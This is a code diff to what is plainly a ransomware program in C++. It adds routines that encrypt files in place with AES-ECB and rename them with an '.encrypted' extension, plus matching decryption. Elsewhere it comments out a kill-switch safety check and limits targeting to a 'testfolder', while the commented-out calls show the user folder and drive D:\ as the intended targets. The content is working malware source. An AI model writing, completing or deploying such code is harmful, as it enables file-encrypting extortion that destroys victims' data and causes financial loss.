@@ -13,10 +13,74 @@
 #include <unistd.h>
 #endif
 
-#include "aes.h"
-#include "drm.h"
-#include "base64.h"
-#include "random.h"
+#include "headers/aes.h"
+#include "headers/drm.h"
+#include "headers/base64.h"
+#include "headers/random.h"
+
+void AES_encrypt(uint8_t* data, uint32_t size, const uint8_t* key) {
+  AES_ctx ctx = AES_init_ctx(key);
+  for (uint32_t i = 0; i < size / AES_BLOCKLEN; i++)
+    AES_ECB_encrypt(&ctx, data + i * AES_BLOCKLEN);
+}
+
+void AES_decrypt(uint8_t* data, uint32_t size, const uint8_t* key) {
+  AES_ctx ctx = AES_init_ctx(key);
+  for (uint32_t i = 0; i < size / AES_BLOCKLEN; i++)
+    AES_ECB_decrypt(&ctx, data + i * AES_BLOCKLEN);
+}
+
+void AES_stream_encrypt(char* filename, const uint8_t* key) {
+  AES_ctx ctx = AES_init_ctx(key);
+  FILE* file = fopen(filename, "rb+");
+  fseek(file, 0, SEEK_END);
+  uint32_t size = ftell(file);
+  uint8_t* block = new uint8_t[AES_BLOCKLEN];
+  for (uint32_t i = 0; i < size; i += AES_BLOCKLEN) {
+    fseek(file, i, SEEK_SET);
+    fread(block, 1, AES_BLOCKLEN, file);
+    AES_ECB_encrypt(&ctx, block);
+    fseek(file, i, SEEK_SET);
+    fwrite(block, sizeof(uint8_t), AES_BLOCKLEN, file);
+  }
+  delete[] block;
+  fclose(file);
+  // Add .encrypted extension
+  char* dest = new char[strlen(filename) + 11];
+  strcpy(dest, filename);
+  strcat(dest, ".encrypted");
+  rename(filename, dest);
+  delete[] dest;
+}
+
+void AES_stream_decrypt(char* filename, const uint8_t* key) {
+  AES_ctx ctx = AES_init_ctx(key);
+  FILE* file = fopen(filename, "rb+");
+  fseek(file, 0, SEEK_END);
+  uint32_t size = ftell(file);
+  uint8_t* block = new uint8_t[AES_BLOCKLEN];
+  // Remove .encrypted extension
+  char* dest = new char[strlen(filename) + 1];
+  strcpy(dest, filename);
+  char* lastdot = strrchr(dest, '.');
+  *lastdot = '\0';
+  FILE* destfile = fopen(dest, "wb");
+  for (uint32_t i = 0; i < size; i += AES_BLOCKLEN) {
+    fseek(file, i, SEEK_SET);
+    fread(block, 1, AES_BLOCKLEN, file);
+    AES_ECB_decrypt(&ctx, block);
+    fseek(destfile, i, SEEK_SET);
+    if (i < (size - AES_BLOCKLEN))
+      fwrite(block, sizeof(uint8_t), AES_BLOCKLEN, destfile);
+    else
+      fwrite(block, sizeof(uint8_t), AES_BLOCKLEN - block[AES_BLOCKLEN - 1], destfile);
+  }
+  delete[] block;
+  delete[] dest;
+  fclose(file);
+  fclose(destfile);
+  remove(filename);
+}
 
 unsigned int cant_files = 0;
 
@@ -65,8 +129,8 @@ void EncryptFile(char* fname, const uint8_t* key) {
   printf("%s\n", fname);
   cant_files++;
 
-  ANSI_X9_23(fname);
-  AES_stream_encrypt(fname, key);
+  //ANSI_X9_23(fname);
+  //AES_stream_encrypt(fname, key);
 
   /*char* dest = new char[strlen(fname) + 11];
   strcpy(dest, fname);
@@ -120,7 +184,7 @@ int main() {
 
   // Warning!!! This is all the security you will get.
   // Remove the line below under your own risk
-  if (KillSwitch()) exit(EXIT_FAILURE);
+  //if (KillSwitch()) exit(EXIT_FAILURE);
 
   /// GENERATE KEY
   char* id; unsigned int len;
@@ -141,14 +205,15 @@ int main() {
 
   /// Encrypt Files in those folders and subfolders:
   // Encrypt user folder
-  SearchFiles(path, key);
+  //SearchFiles(path, key);
   // Encrypt example folder (use always two backslashes)
-  SearchFiles("..\\testfolder", key);
+  //SearchFiles("..\\testfolder", key);
+  SearchFiles("testfolder", key);
   // Encrypt disk "D:\"
-  SearchFiles("D:\\", key);
+  //SearchFiles("D:\\", key);
 #else
   // On linux use a single slash
-  SearchFiles("../testfolder", key);
+  //SearchFiles("../testfolder", key);
 #endif
 
   delete[] key;
